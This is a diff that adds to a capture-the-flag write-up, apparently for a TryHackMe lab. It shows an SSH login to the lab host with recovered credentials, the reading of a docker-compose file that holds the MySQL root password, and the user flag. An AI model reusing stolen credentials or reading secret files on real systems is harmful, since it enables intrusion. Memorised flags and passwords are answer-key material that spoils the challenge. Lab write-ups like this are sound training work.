@@ -273,4 +273,42 @@ Access MySQL databases, password for mysql `Ng1-f3!Pe7-e5?Nf3xe5`
     +----------+----------------------------------+-------+
     4 rows in set (0.119 sec)
 
+![image](https://github.com/zer00d4y/writeups/assets/128820441/a45f7248-a301-447a-8765-b8afc5df40e5)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/f109e467-345b-467f-b7a3-f540f0b64851)
+
+`ssh claire-r@10.10.5.167`
+
+    claire-r@ctf:~$ id
+    uid=1001(claire-r) gid=1001(claire-r) groups=1001(claire-r)
+    claire-r@ctf:~$ ls
+    timeTracker-src  user.txt
+    claire-r@ctf:~$ cat user.txt 
+    THM{d832c0e4cf71312708686124f7a6b25e}
+    claire-r@ctf:~$ cd timeTracker-src/
+    claire-r@ctf:~/timeTracker-src$ ls
+    app.js  db  docker-compose.yml  Dockerfile  logs  package.json  package-lock.json  public  views
+    claire-r@ctf:~/timeTracker-src$ cat docker-compose.yml 
+    version: '3.3'
+    services:
+      db:
+        image: mysql:5.7
+        restart: always
+        environment:
+          MYSQL_DATABASE: 'timetracking'
+          MYSQL_ROOT_PASSWORD: 'Ng1-f3!Pe7-e5?Nf3xe5'
+        ports:
+          - '3306:3306'     
+        volumes:
+          - ./db:/docker-entrypoint-initdb.d
+      app:
+        image: umbrella/timetracking:latest
+        restart: always
+        ports:
+          - '8080:8080'
+        volumes:
+          - ./logs:/logs
+
+User FLAG: `THM{d832c0e4cf71312708686124f7a6b25e}`
+
 
